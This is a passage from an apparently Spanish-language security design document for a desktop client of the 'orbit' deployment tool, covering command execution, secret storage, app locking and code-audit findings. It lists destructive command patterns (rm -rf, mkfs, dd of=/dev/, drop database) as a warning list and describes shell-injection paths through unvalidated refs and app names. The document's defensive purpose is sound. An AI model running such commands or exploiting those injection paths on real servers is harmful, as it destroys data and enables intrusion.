   «confío en la interfaz» en «he leído lo que va a pasar», y es la mitigación de
   T-03 que el usuario puede verificar por sí mismo.
3. **La regla del argumento único se hace explícita.** Dos modos visibles en la
   interfaz: *comando* (argumentos separados, sin shell) y *shell* (texto que
   interpreta `bash -lc`). Motivo: si la interfaz decide sola cuál usar aplicando la
   heurística del servidor, el usuario no puede predecir cuándo su `&&` se ejecuta y
   cuándo se pasa como argumento literal. **Una herramienta de depuración que no es
   predecible tampoco sirve.**
4. **No hay confirmación por cada comando.** Sería inutilizable y la gente aprendería
   a pulsar sin leer, que es peor que no tenerla. Lo que sí hay:
   - **Confirmación adicional sólo en servidores marcados como producción**, y sólo
     para el primer comando de la sesión, no para cada uno.
   - **Una lista corta de patrones que sí paran**, con confirmación reforzada: `rm -rf`
     con una ruta absoluta, `drop database`, `truncate`, `mkfs`, `dd of=/dev/`,
     `chmod -R 777 /`, `> /dev/sd`. Es una lista negra y **por eso su valor es
     pedagógico, no defensivo**: no impide nada —hay mil formas de escribir un `rm`—
     pero sí para el error de dedos a las tres de la mañana, que es el caso real.
     Se documenta como tal para que nadie la confunda con una protección.
5. **El histórico es de sesión y no toca el disco** por defecto (T-06, canal 5).
6. **La salida se pinta como texto plano, siempre.** Es salida arbitraria de un
   proceso arbitrario: puede traer secuencias ANSI, bytes nulos, megas de una línea.
   Se renderiza como texto, con límite de tamaño en pantalla y volcado a un fichero
   si el usuario lo pide. Nunca se interpreta.
7. **Se advierte del `.env` una vez por sesión**: «lo que ejecutes aquí ve todos los
   secretos de esta app». Es cierto y la gente no lo sabe.
8. **Un `exec` con un comando que espera entrada interactiva es un caso que hay que
   decidir.** `orbit exec web` sin comando abre `bash` (línea 9007). Un cliente sin
   terminal no puede con eso. Propuesta: la interfaz **no ofrece la shell
   interactiva**, y en su lugar tiene un botón que copia al portapapeles la orden
   `ssh` completa para pegarla en un terminal de verdad. Es más honesto que emular
   media terminal, y es exactamente lo que §13.5 dice de fingir un terminal:
   *«la peor solución de todas»*.

---

## 4. Autenticación y sesión

### 4.1 Qué se guarda, y qué no

**Se guarda** (esto es A7, y es todo lo que hace falta):

| Campo | Ejemplo | Por qué |
|---|---|---|
| Alias | `producción-1` | Lo que ve el usuario |
| Host | `vps.ejemplo.com` o un alias de `~/.ssh/config` | |
| Usuario | `root`, `dave` | |
| Puerto | `22` | |
| Ruta de la clave | `~/.ssh/id_ed25519` | Sólo la **ruta**, jamás el contenido |
| Ruta del binario | `/usr/local/bin/orbit` | SEC-03 |
| Color / etiqueta | `producción` | T-07 |
| Última versión vista | `1.3.6` / contrato `1` | Para avisar de incompatibilidades |
| Idioma preferido | `es` / `en` | |

**No se guarda nunca:** claves privadas, frases de paso, contraseñas, tokens de
Cloudflare o GitHub, valores del `.env`, salida de `logs` o `exec`, ni ningún dato
personal de los visitantes que devuelva `orbit traffic`.

**Y el caso preferente:** si el servidor está en `~/.ssh/config`, se guarda **el alias
y nada más**. El usuario, el puerto, la clave y el `ProxyJump` los resuelve `ssh`.
Duplicar esa información en nuestra configuración crea dos verdades, y cuando el
usuario cambie el `~/.ssh/config` la nuestra quedará vieja y apuntando a otro sitio.
Es la regla 1 aplicada a la configuración del cliente.

### 4.2 Dónde, y con qué permisos

**Linux — XDG, sin discusión.**

- Configuración: `$XDG_CONFIG_HOME/orbit-desktop/` (por defecto
  `~/.config/orbit-desktop/`), directorio `0700`, ficheros `0600`.
- Estado y caché: `$XDG_STATE_HOME/orbit-desktop/` y `$XDG_CACHE_HOME/orbit-desktop/`.
  Separados de la configuración a propósito: la caché se puede borrar entera sin
  perder nada, y **eso hay que poder decírselo al usuario**.
- Nada en `~/.orbit-desktop`. Un directorio de punto en el `$HOME` cuando existe el
  estándar es la clase de detalle por el que se juzga si un proyecto respeta la
  plataforma.
- Los secretos que haya que guardar —si algún día los hubiera— van al Secret Service
  (`libsecret`), no a un fichero. Con la reserva honesta de que en un escritorio sin
  demonio de llavero eso no existe: en ese caso **no se guarda**, y se dice, en vez de
  caer a un fichero en claro sin avisar.

**macOS.**

- Configuración en `~/Library/Application Support/com.intervolutions.orbit-desktop/`,
  `0700`.
- Cualquier secreto va al **Keychain**, con el elemento marcado para requerir
  desbloqueo. Y la clave SSH la gestiona el `ssh` del sistema con
  `--apple-use-keychain`, que ya lo hace bien: no lo reimplementamos.
- La aplicación va firmada y notarizada. Sin eso, Gatekeeper la trata como software
  sin origen y el usuario aprende a saltarse el aviso, que es justo el hábito que no
  queremos crear en quien administra producción.

**Windows.**

- Configuración en `%APPDATA%\Orbit Desktop\`, con la ACL restringida al usuario
  —Windows no tiene `0600`, así que se pone explícitamente y **se comprueba en una
  prueba**, porque el valor por defecto heredado del directorio padre suele ser más
  laxo de lo que se cree—.
- Secretos en el **Credential Manager** vía DPAPI (`CredWrite` / `CryptProtectData`),
  que ata el dato al usuario y a la máquina.
- El transporte usa el `ssh.exe` de OpenSSH que trae Windows desde la 1809, y el
  agente es el servicio `ssh-agent`. No embebemos un cliente SSH: mismo motivo que en
  T-03.

**Regla común, y es la que importa:** el almacén de secretos del sistema se usa para
**secretos**, y en el diseño propuesto no hay ninguno que guardar. Si eso se cumple,
el peor caso de un robo de la configuración es A7 —el mapa— y no A1. Si un día hay
que guardar algo, **se guarda ahí y no en un fichero nuestro cifrado con una clave
que también está en el disco**.

### 4.3 Los permisos se comprueban, no se suponen

Una prueba en el arranque: si el directorio de configuración tiene permisos más
laxos de los que debería, la aplicación **lo corrige y lo dice**. Es lo que hace
`ssh` con `~/.ssh` y es un comportamiento que la gente ya conoce. Y se comprueba en
una prueba automática, porque los `umask` raros existen y la creación del directorio
en el primer arranque es el momento donde esto se estropea.

### 4.4 Bloqueo de la aplicación

Aquí hay que ser honesto sobre lo que un bloqueo puede y no puede hacer, porque es
donde los productos venden humo.

**Lo que un bloqueo NO hace:** no protege contra C1 ni C2. Si hay malware ejecutando
como el usuario, el bloqueo de nuestra ventana no le impide nada: puede lanzar `ssh`
por su cuenta.

**Lo que sí hace, y basta para justificarlo:** protege contra **el equipo desatendido**
—el portátil abierto en la mesa, en la cafetería, en la oficina compartida— que es el
escenario real y frecuente. Y contra C7.

**Política:**

- **Bloqueo por inactividad**, por defecto **15 minutos**, configurable entre 1 minuto
  y «nunca». «Nunca» existe porque prohibirlo hace que la gente ponga un ratón que se
  mueve solo, y entonces ya no hay bloqueo ni información sobre ello.
- **Bloqueo inmediato** con un atajo y con el bloqueo de sesión del sistema operativo.
  Escuchar el evento de bloqueo de pantalla del sistema es la mitad del valor de esta
  función: el usuario ya tiene el hábito de bloquear la pantalla.
- **Al bloquearse:** se ocultan todos los valores revelados, se limpia el portapapeles
  si contiene un secreto que pusimos nosotros, y **se borran de memoria los valores
  de `env get`**. Lo que no se hace es cortar las operaciones en curso: un despliegue
  de tres minutos no se aborta porque el usuario se haya ido a por café. Se sigue, y
  el resultado espera detrás del bloqueo.
- **Desbloqueo con el mecanismo del sistema**: Touch ID / Windows Hello / `polkit` en
  Linux. No una contraseña nuestra: una contraseña nuestra es una credencial más que
  guardar, y la sección 4.1 dice que no guardamos credenciales.
- **En servidores marcados como producción, el bloqueo por inactividad no se puede
  poner en «nunca».** Es la única excepción, y se justifica en la interfaz.
- **Lo que se descarta:** un PIN propio. Es una credencial que hay que guardar y
  verificar, con toda su superficie —almacenamiento, derivación, límite de intentos,
  recuperación— para proteger contra un atacante que, si está en la máquina, ya ha
  ganado. Coste alto, beneficio ilusorio.

---


## Apéndice A · Hallazgos concretos de la auditoría del código

### A.1 Hallazgos de lectura (ronda 1)

Resumen de lo verificado en `orbit` v1.3.6, para que quien retome esto no tenga que
volver a leerlo. Nada de esto es una vulnerabilidad de Orbit —todos los caminos exigen
root, que ya es el requisito para invocarlo— pero todos condicionan el diseño del
cliente.

| Línea(s) | Qué | Consecuencia para Orbit Desktop |
|---|---|---|
| 241-260 | Auto-elevación con `exec sudo -- "$0" "$@"`, salvo `init` | No hay modo sin privilegios. El cliente es root en el servidor. |
| 854 | `need_root()` | Casi todos los comandos lo llaman. |
| 868 | `as_deploy() { sudo -u "$DEPLOY_USER" -H bash -lc "$*"; }` | El servidor ejecuta cadenas, no `argv`. Todo lo que le mandemos acaba en un shell. |
| 1071-1080 | `_j_str` escapa `\`, `"`, `\b \f \n \r \t`, y **borra** el resto de C0 | **No escapa `<`, `>`, `&`, `'`, `/`, U+2028/2029 ni bidi.** El escapado de HTML es responsabilidad del cliente. |
| 1084 | `_j_num` acepta sólo enteros `^-?[0-9]+$` | Todo lo demás sale `null`. Tres causas distintas con la misma representación. |
| 1165 | `app_names()` enumera `*.conf` **sin** filtrar por `_app_name_ok` | Canal por el que un servidor con root comprometido inyecta un nombre arbitrario en el contrato. |
| 1175 | `_app_name_ok`: `^[a-z0-9][a-z0-9._-]{0,39}$`, sin `..` | La regla de forma que el cliente debe copiar. Se aplica al crear, no al enumerar. |
| 1319-1328 | `load_app` hace `. "$(app_conf "$n")"` | El `.conf` de una app **es código bash ejecutado como root**. Refuerza la regla 1. |
| 1329 | `_q()` entrecomilla en simples duplicando las internas | El patrón correcto, usado en `save_app`. |
| 5194-5195, 5276-5304 | `--ref` sin validar, llega a `as_deploy "… '$fref' …"`; `$A_BRANCH` sin comillas dentro del literal (5304) | Una comilla simple en el ref, o un espacio en la rama, ejecutan como `deploy`. **El servidor no sanea; el cliente tiene que hacerlo bien.** |
| 6989-6991, 11287-11295 | El dominio **no se valida** en `new` ni en `domain`, y acaba en `server_name $names;` (3907) | El cliente valida dominios aunque el servidor no lo haga. |
| 8963-8987 | `_exec_script` con `sudo … bash -lc "$script" orbit-exec "$envf" … "$@"` | **El patrón correcto**: script fijo, datos por parámetros posicionales. Es el modelo a imitar. |
| 9005-9013 | `cmd_exec`: un solo argumento con metacaracteres se ejecuta como `bash -lc` | `exec web "ls -la"` y `exec web ls -la` no son lo mismo. El cliente debe hacer explícitos los dos modos. |
| 8965 | El `.env` se carga con `set -a` | Todo lo que se ejecute con `exec` ve los secretos de la app. |
| 9024 | `logline "exec $name"` — sólo el nombre | El estándar de registro que el cliente hereda. |
| 11274-11285 | `env list --json` devuelve sólo `keys` | §13.2 cumplido en el servidor. La otra mitad es del cliente. |
| 11324-11348 | `cmd_remove`: pide escribir el nombre **sólo sin `-y`**; `--purge` cortocircuita la segunda pregunta | **Con `-y --purge` no hay ninguna confirmación.** Toda la protección se traslada al cliente. |
| 11362-11364 | `userdel` del usuario de la app sólo con `--purge`, con guarda contra `DEPLOY_USER` | El daño irreversible incluye el usuario de sistema. |
| 6698-6723 | `cmd_rollback`: sin release y sin terminal, aborta | El cliente siempre nombra la release. La activa se detecta y no se ofrece. |
| 11493-11498 | `"load"` se emite crudo desde `/proc/loadavg`, sin `_j_num` | Puede salir `[]`. P-41. |
| 8726 | `cpu_percent` compuesto con aritmética de shell, sin `_j_num` | Un valor inesperado produciría un número JSON inválido. |
| 12022 | `version --json` publica `version` **y** `contract` | Dos ejes, y §13.1 avisa de que confundirlos hace que un cliente rechace un servidor compatible. |

### A.2 Hallazgos verificados **ejecutando** (ronda 2)

Los cuatro primeros están en `EVIDENCIA.md` con su banco reproducible. Los dos últimos son
consecuencias de lectura que la ejecución confirma.

| # | Qué | Cómo se comprobó | Consecuencia para el cliente |
|---|---|---|---|
| A-01 | **`orbit doctor --fix --json --yes` no existe.** Está documentado en `USAGE.md:1674` y en `ARCHITECTURE §19.5`. `cmd_doctor` (12084-12089) rechaza todo lo que no sea `--fix`; y `--yes` no es bandera global —el bucle de `main()` (13627-13637) sólo reconoce `--json`, `--eva`, `--lang`—. Muerto por las dos ramas | Ejecutado: `✗ orbit doctor: no sé qué es «--yes»`, rc=1; y `orbit --yes version --json` → `✗ Comando desconocido: --yes` | **El botón de arreglo automático no se pinta.** Se enseña el texto de `fix`, que es para lo que existe `fixable`. Y se abre un PR contra `orbit`: el arreglo son tres líneas. P-49, SEC-27, B-60 |
| A-02 | **Sin TTY, un comando sin app no aborta: elige la primera.** Sólo se protegen `info --json`, `deploy --json` y `rollback` | Ejecutado: `orbit info </dev/null` imprime el menú, **elige `app01`** y sale con rc=0 | `orbit restart` sin app reinicia la primera por orden alfabético, con rc 0 y sin decirlo. **El tipo del constructor exige el nombre de la app siempre.** P-50, SEC-26, B-59 |
| A-03 | **Suelo de 72 ms por llamada.** `version --json` no lee ninguna app y aun así tarda eso: son 13.720 líneas de Bash que el intérprete parsea cada vez | Medido, mediana de 7 ejecuciones, 40 apps sembradas | Es el presupuesto mínimo de cada pantalla, antes de la red. Y un servidor que conteste en 5 ms no es Orbit. P-51 |
| A-04 | **`list --json` 306 ms, `status --json` 389 ms, `info --json` 86 ms** con 40 apps | Medido igual | La cifra de 250 ms de §13.6d se sostiene en otra máquina. Y `status` cuesta un 27 % más que `list` trayendo estrictamente más: la portada se alimenta de **una** llamada, no de dos |
| A-05 | **`printf %q` de bash no sirve como escapador portable**: produce `$'\n'`, que `dash` y `busybox ash` no entienden | Deducido y confirmado por la prueba de propiedad, que sostiene la identidad con comillas simples y no con `%q` | Corrige una imprecisión de la ronda 1 de este documento. La forma correcta es la de §T-03, capa 2 |
| A-06 | **`logline` (473) no registra quién ejecutó nada**: `printf '%s %s\n' "$(date -Iseconds)" "$*"`. Un `remove tienda purge=yes` en el log no dice quién lo pidió | Lectura, confirmada por la forma de la función | En un equipo, la única atribución posible sin tocar el servidor es **un usuario SSH por persona** en vez de todos como `root`. T-11b, D-15 |
